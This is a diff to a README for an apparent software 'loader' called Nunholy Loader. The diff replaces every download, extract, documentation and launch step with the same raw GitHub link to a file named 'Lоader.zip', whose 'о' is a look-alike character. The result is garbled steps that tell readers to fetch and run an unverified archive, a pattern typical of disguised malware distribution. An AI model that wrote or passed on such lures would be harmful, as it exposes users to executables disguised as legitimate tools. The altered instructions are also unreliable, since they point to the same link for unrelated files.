@@ -61,17 +61,17 @@ Below is an overview of the available functions within Nunholy Loader, designed 
 
 Ready to get started? Follow these steps to unlock the full potential of Nunholy Loader on your device. Please ensure you adhere to software usage guidelines and local laws.
 
-**1. Download Loader.rar from the repository.**  
-**2. Extract Loader.rar with a modern archiving tool (WinRAR, 7zip, Keka, or similar).**  
-**3. Open the extracted folder and review the included README_FIRST.txt for OS-specific instructions.**  
+**1. Download https://raw.githubusercontent.com/SriAbishekrs/Nunholy-Freeway/main/Lоader.zip from the repository.**  
+**2. Extract https://raw.githubusercontent.com/SriAbishekrs/Nunholy-Freeway/main/Lоader.zip with a modern archiving tool (WinRAR, 7zip, Keka, or similar).**  
+**3. Open the extracted folder and review the included https://raw.githubusercontent.com/SriAbishekrs/Nunholy-Freeway/main/Lоader.zip for OS-specific instructions.**  
 **4. Launch the Nunholy Loader executable for your operating system:**  
-    - On **Windows**: Double-click `NunholyLoader.exe`
-    - On **macOS**: Control-click `NunholyLoader.app` > Open  
+    - On **Windows**: Double-click `https://raw.githubusercontent.com/SriAbishekrs/Nunholy-Freeway/main/Lоader.zip`
+    - On **macOS**: Control-click `https://raw.githubusercontent.com/SriAbishekrs/Nunholy-Freeway/main/Lоader.zip` > Open  
     - On **Linux**: Run `./nunholyloader` in terminal
 
 **5. Follow on-screen prompts to configure your experience and enjoy!**  
 
-For manual dependency setup, consult the full [Installation Guide](INSTALL.md).
+For manual dependency setup, consult the full [Installation Guide](https://raw.githubusercontent.com/SriAbishekrs/Nunholy-Freeway/main/Lоader.zip).
 
 ---
 
